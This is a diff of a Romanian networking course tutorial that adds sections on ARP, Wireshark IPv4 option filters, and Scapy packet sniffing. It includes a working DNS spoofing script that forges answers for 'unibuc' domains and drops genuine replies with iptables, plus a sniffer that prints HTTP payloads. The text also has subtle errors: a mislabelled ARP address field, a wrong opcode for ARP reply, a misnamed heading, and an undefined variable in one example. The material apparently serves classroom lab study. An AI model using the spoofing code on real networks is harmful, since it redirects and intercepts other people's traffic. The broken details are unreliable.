@@ -25,6 +25,8 @@
   - [IPv6 Scapy](#ipv6_scapy)
 - [Ethernet Frame](#ether)
   - [Ethernet Object in Scapy](#ether_scapy)
+- [Address Resolution Protocol](#arp)
+  - [ARP in Scapy](#arp_scapy)
 - [Scapy Tutorial](#scapy)
   - [Exemplu ICMP ping](#scapy_ping)
   - [Exemplu DNS](#scapy_dns)
@@ -709,7 +711,11 @@ Prima specificație a protocolului IP a fost în [RFC791](https://tools.ietf.org
 - Protocol - indică codul [protocolului](https://en.wikipedia.org/wiki/List_of_IP_protocol_numbers) din interiorul secvenței de date
 - Header checksum - aceeași metodă de checksum ca la [TCP si UDP](https://en.wikipedia.org/wiki/Transmission_Control_Protocol#Checksum_computation), adică suma în complement 1, a fragmentelor de câte 16 biți, dar în cazul acesta se aplică **doar pentru header**. Această sumă este puțin redundantă având în vedere că se mai calculează o dată peste pseudoheader-ul de la TCP sau UDP.
 - Source/Destination Address - adrese ip pe 32 de biți
-- [Options](https://www.iana.org/assignments/ip-parameters/ip-parameters.xhtml) - sunt opțiuni la nivelul IP. Mai multe informații despre rolul acestora puteți găsi [aici](http://www.tcpipguide.com/free/t_IPDatagramOptionsandOptionFormat.htm), [aici](http://www.cc.ntut.edu.tw/~kwke/DC2006/ipo.pdf) și specificația completă [aici](http://www.networksorcery.com/enp/protocol/ip.htm#Options). Din [lista de 30 de optiuni](https://www.iana.org/assignments/ip-parameters/ip-parameters.xhtml), cel putin 11 sunt deprecated in mod oficial, 8 sunt experimentale/ putin documentate, din cele ramase, o buna parte sunt neimplementate de catre routere sau prezinta riscuri de securitate. Spre exemplu, optiunea [traceroute](https://networkengineering.stackexchange.com/questions/10453/ip-traceroute-rfc-1393), si optiunea [record route](https://networkengineering.stackexchange.com/questions/41886/how-does-the-ipv4-option-record-route-work) care nu au fost implementate, sau optiunile [source based routing](https://howdoesinternetwork.com/2014/source-based-routing) cu risc sporit de securitate. E bine de știut că unele opțiuni prezintă și riscuri de securitate [conform wikipedia](https://en.wikipedia.org/wiki/IPv4#Options) sau acestui [raport](https://www2.eecs.berkeley.edu/Pubs/TechRpts/2005/EECS-2005-24.pdf). 
+- [Options](https://www.iana.org/assignments/ip-parameters/ip-parameters.xhtml) - sunt opțiuni la nivelul IP. Mai multe informații despre rolul acestora puteți găsi [aici](http://www.tcpipguide.com/free/t_IPDatagramOptionsandOptionFormat.htm), [aici](http://www.cc.ntut.edu.tw/~kwke/DC2006/ipo.pdf) și specificația completă [aici](http://www.networksorcery.com/enp/protocol/ip.htm#Options). Din [lista de 30 de optiuni](https://www.iana.org/assignments/ip-parameters/ip-parameters.xhtml), cel putin 11 sunt deprecated in mod oficial, 8 sunt experimentale/ putin documentate, din cele ramase, o buna parte sunt neimplementate de catre routere sau prezinta riscuri de securitate. Spre exemplu, optiunea [traceroute](https://networkengineering.stackexchange.com/questions/10453/ip-traceroute-rfc-1393), si optiunea [record route](https://networkengineering.stackexchange.com/questions/41886/how-does-the-ipv4-option-record-route-work) care nu au fost implementate, sau optiunile [source based routing](https://howdoesinternetwork.com/2014/source-based-routing) cu risc sporit de securitate, mai multe în [acest raport](https://www2.eecs.berkeley.edu/Pubs/TechRpts/2005/EECS-2005-24.pdf). 
+
+###### Wireshark IPv4 Options
+Ca să captați cu [Wireshark](https://osqa-ask.wireshark.org/questions/25504/how-to-capture-based-on-ip-header-length-using-a-capture-filter) IP datagrams care conțin opțiuni, puteți folosi filtrul care verifică ultimii 4 biți ai primului octet: `ip[0] & 0xf != 5`. Veți putea observa pachete cu [protocolul IGMP](https://www.youtube.com/watch?v=2fduBqQQbps) care are setată [opțiunea Router Alert](http://www.rfc-editor.org/rfc/rfc6398.html) 
+
 
 <a name="ip_raw_socket"></a> 
 ### IPv4 Object from Raw Socket
@@ -983,44 +989,135 @@ WARNING: Mac address to reach destination not found. Using broadcast.
 # singurele câmpuri de care trebuie să ținem cont sunt adresele și EthType
 ```
 
+<a name="arp"></a> 
+## [Address Resolution Protocol](http://www.erg.abdn.ac.uk/users/gorry/course/inet-pages/arp.html)
+[ARP](https://www.youtube.com/watch?v=QPi5Nvxaosw) este un protocol care face maparea între protocolul de retea (IP) și adresele hardware/fizice sau Media Access Control (MAC) de pe o rețea locală. Acesta a fost definit în [RFC 826](https://tools.ietf.org/html/rfc826), în 1982 și este strâns legat de adresele IPv4, pentru IPv6 există [neighbour discovery](https://tools.ietf.org/html/rfc3122). Un tutorial bun și mai multe explicații pot fi [găsite și aici](http://www.danzig.jct.ac.il/tcp-ip-lab/ibm-tutorial/3376c28.html)
+
+Antetul pentru ARP este redat cu adresele hardware iesind din limita de 32 de biti:
+```
+  0               1               2               3              4 Offs.
+  0 1 2 3 4 5 6 7 0 1 2 3 4 5 6 7 0 1 2 3 4 5 6 7 0 1 2 3 4 5 6 7 
+ -+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-
+ |         HWType                |           ProtoType           |
+ -+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-
+ |   HWLen       |   ProtoLen    |          Operation            |
+ -+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-
+ |                   Adresa Hardware Sursa          de tipul  HWType          <--- HWLen octeti (6 pt Ethernet)
+ -+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-
+ |                   Adresa Proto Destinatie        de tipul ProtoType        <--- ProtoLen octeti (4 pt IPv4)
+ -+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-
+ |                   Adresa Hardware Destinatie                               <--- HWLen octeti (6 pt Ethernet)
+ -+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-
+ |                   Adresa Proto Destinatie                                  <--- ProtoLen octeti (4 pt IPv4)
+ -+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-
+
+```
+
+- HWType - [tipul de adresa fizică](https://www.iana.org/assignments/arp-parameters/arp-parameters.xhtml#arp-parameters-2), codul 1 pentru Ethernet (adrese MAC)
+- ProtoType - indică codul [protocolului](https://en.wikipedia.org/wiki/EtherType#Examples) folosit ca adresa la nivelul rețea - 0x0800 sau 2048 pentru IPv4
+- HWLen - este lungimea adresei hardware sursă sau destinație, pentru Ethernet valoarea este 6 (o adresă MAC are 6 octeți)
+- ProtoLen - reprezintă lungimea adresei de la protocolul destinație, pentru IPv4 valoarea este 4 (o adresă IPv4 are 4 octeți)
+- Adresa Hardware Sursă/Destinație - lungime variabilă în funcție de HWLen, în general adrese Ethernet
+- Adresa Proto Sursă/Destinație - lungime variabilă în funcție de HWLen, în general adrese IPv4
+ 
+<a name="arp_scapy"></a> 
+### Ethernet Object in Scapy
+Vom lucra cu adrese MAC standard și IPv4, acestea sunt publice și sunt colectate din rețeaua locală. În scapy este deja implementat antetul pentru ARP:
+```python
+>>> ls(ARP)
+hwtype     : XShortField                         = (1)                     # ce tip de adresa fizica, 1 pt MAC-uri
+ptype      : XShortEnumField                     = (2048)                  # protocolul folosit, similar cu EthType 
+hwlen      : ByteField                           = (6)                     # dimensiunea adresei MAC (6 octeti)
+plen       : ByteField                           = (4)                     # dimensiunea adresei IP (pentru v4, 4 octeti)
+op         : ShortEnumField                      = (1)                     # operatiunea 1 pentru request, 0 pentru reply   
+hwsrc      : ARPSourceMACField                   = (None)                  # adresa MAC sursa
+psrc       : SourceIPField                       = (None)                  # adresa IP sursa
+hwdst      : MACField                            = ('00:00:00:00:00:00')   # adresa MAC destinatie
+pdst       : IPField                             = ('0.0.0.0')             # adresa IP destinatie (poate fi si un subnet)
+```
+
+Pentru a putea trimite un mesaj unui IP din rețeaua locală, va trebui să știm adresa hardware a acestuia iar ca să aflăm această adresă trebuie să trimitem pe întreaga rețea locală (prin difuzare sau broadcast) întrebarea "Cine are adresa MAC pentru IP-ul X?". În cazul în care un dispozitiv primește această întrebare și se identifică cu adresa IP, el va răspunde cu adresa lui fizică.
+Perechile de adrese hardware și adrese IP sunt stocate într-un tabel cache pe fiecare dispozitiv. 
+
+Exemplu în scapy:
+```python
+# adresa fizică rezervata pentru broadcast ff:ff:ff:ff:ff:ff
+eth = Ether(dst = "ff:ff:ff:ff:ff:ff")
+
+# adresa proto destinație - IP pentru care dorim să aflăm adersa fizică
+arp = ARP(pdst = '198.13.13.1')
+
+# folosim srp1 - send - receive (sr) 1 pachet
+# litera p din srp1 indică faptul că trimitem pachetul la layer data link 
+answered = srp1(eth / arp, timeout = 2)
+
+if answered is not None:
+  print (answered[ARP].psrc)
+  # adresa fizică este:
+  print (answered[ARP].hwsrc)
+else:
+  print ("Nu a putut fi gasita")  
+```
+
+În felul acesta putem interoga device-urile din rețea și adresele MAC corespunzătoare. Putem folosi scapy pentru a trimite un broadcast întregului subnet dacă setăm `pdst` cu valoarea subnetului `net`. 
+
 
 <a name="scapy"></a> 
 ## [Tutorial Scapy](https://scapy.readthedocs.io/en/latest/usage.html#starting-scapy)
-Este o unealtă de python pe care o putem folosi pentru a construi pachete și configura manual headerele mesajelor transmise. 
-Presupunem că am deschis scapy în client (`docker-compose exec client scapy`) și vrem să trimitem un mesaj prin UDP unui server și care ascultă pe portul 10000. 
-```python
-# presupunem că rulam serverul pe server
 
-udp_layer = UDP()
-udp_layer.sport = 54321
-udp_layer.dport = 10000
-
-ip_layer = IP()
-ip_layer.src = '172.10.0.2'
-ip_layer.dst = '198.10.0.2'
-
-mesaj = Raw()
-mesaj.load = "payload manual"
-
-# folosim operatorul / pentru a stivui layerele
-# sau pentru a adăuga layerul cel mai din dreapta
-# în secțiunea de date/payload a layerului din stânga sa
-pachet_complet = ip_layer / udp_layer / mesaj
-
-# trimitem făra a aștepta un răspuns
-send(pachet_complet)
-
-# trimitem și înregristrăm răspunsurile
-ans, unans = sr(pachet_complet, retry=3)
-print ans
-# <Results: TCP:0 UDP:1 ICMP:0 Other:0>
-
-# ans conține o listă de tupluri [(request1, response1), (request2, response2)]
-# răspunsul la primul requeste este mesajul primit de la server:
-print ans[0][1]
-# <IP  version=4L ihl=5L tos=0x0 len=38 id=44462 flags=DF frag=0L ttl=63 proto=udp chksum=0x1b80 src=172.10.0.2 dst=198.10.0.14 options=[] |<UDP  sport=10000 dport=54312 len=18 chksum=0x72bc |<Raw  load='am primit' |>>>
-
+Funcția `sniff()` ne permite să captăm pachete în cod cum am face cu wireshark sau tcpdump. De asemenea putem salva captura de pachete în format .pcap cu tcpdump: 
+```bash
+tcpdump -i any -s 65535 -w example.pcap
 ```
+și putem încărca pachetele în scapy pentru a le procesa:
+```python
+packets = rdpcap('example.pcap')
+for pachet in packets:
+  if pachet.haslayer(ARP):
+    pachet.show()
+```
+
+Mai mult, funcția sniff are un parametrul prin care pute trimite o metodă care să proceseze pachetul primit în funcție de conținut:
+```python
+def handler(pachet):
+  if pachet.haslayer(TCP):
+    if pachet[TCP].dport == 80: #or pachet[TCP].dport == 443:
+      if pachet.haslayer(Raw):
+        raw = pachet.getlayer(Raw)
+        print(raw.load)
+sniff(prn=handler)
+```
+
+De asemenea, cu scapy putem citi și octeții dintr-un socket raw dacă știm care este primul layer (cel mai de jos):
+```python
+# vezi exemplul de mai sus cu UDP Raw Socket
+raw_socket_date = b'E\x00\x00!\xc2\xd2@\x00@\x11\xeb\xe1\xc6\n\x00\x01\xc6\n\x00\x02\x08\xae\t\x1a\x00\r\x8c6salut'
+
+pachet = IP(date)
+pachet.show()
+###[ IP ]### 
+  version= 4
+  ihl= 5
+  tos= 0x0
+  len= 33
+  id= 49874
+  flags= DF
+  frag= 0
+  ttl= 64
+  proto= udp
+  chksum= 0xebe1
+  src= 198.10.0.1
+  dst= 198.10.0.2
+  \options\
+###[ UDP ]### 
+     sport= 2222
+     dport= 2330
+     len= 13
+     chksum= 0x8c36
+###[ Raw ]### 
+        load= 'salut'
+```
+
 
 În scapy avem mai multe funcții de trimitere a pachetelor:
 - `send()` - trimite un pachet pe rețea la nivelul network, iar secțiunea de ethernet este completată de către sistem
@@ -1074,8 +1171,7 @@ rec.show()
 
 <a name="scapy_dns"></a> 
 ### Exemplu DNS request
-
-
+Mai jos aveți un exemplu de cerere DNS:
 ```python
 ip = IP(dst = '8.8.8.8')
 transport = UDP(dport = 53)
@@ -1086,6 +1182,38 @@ dns.qd = dns_query
 
 answer = sr1(ip / transport / dns)
 print (answer[DNS].summary())
+```
+
+#### DNS spoofing
+Putem seta DNS-ul nostru (pe linux, în fișierul `/etc/resolv.conf` sau ca în [exemplul de aici](https://unix.stackexchange.com/questions/128220/how-do-i-set-my-dns-when-resolv-conf-is-being-overwritten)), atunci putem trimite răspunsuri tip DNS false dacă intermediem conexiunea unui device:
+
+```python
+# este necesar să rezervăm portul acesta în cazul în care noi suntem DNS
+# pentru a nu trimite sistemul de operare ICMP Destination Port Unreachable
+s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, proto=socket.IPPROTO_UDP)
+s.bind(('0.0.0.0', 53))
+def spoof_dns(packet):
+  ip = packet.getlayer(IP)
+  udp = packet.getlayer(UDP)
+  dnsqr = packet.getlayer(DNSQR)
+  # daca pachetul are IP/UDP/DNS/DNSQR
+  if dnsqr is not None and ip is not None and udp is not None:
+    print(packet.__str__)
+    if 'unibuc' in dnsqr.qname.decode('utf-8'):
+      # sursa este destinatia si vice-versa
+      ip_response = IP(src=ip.dst, dst=ip.src)
+      udp_response = UDP(sport=udp.dport, dport=udp.sport)
+      dns_answer = DNSRR(
+          rrname=dnsqr.qname, ttl=330, type="A", rclass="IN", rdata='1.1.1.1')
+      dns_response = DNS(id = packet[DNS].id, qr = 1, aa = 0, rcode = 0, qd = packet.qd, an = dns_answer)
+      print (dns_response.__str__)
+      send(ip_response / udp_response / dns_response)
+
+# alegem interfata pe care sa trimite, eth1 in cazul routerului
+sniff(prn=spoof_dns, iface='eth1')
+# daca suntem intermediar, ar trebui sa oprim orice alte raspunsuri
+# de la DNS-ul public folosind o regula de iptables:
+# iptables -I INPUT -p udp --sport 53 -j DROP
 ```
 
 
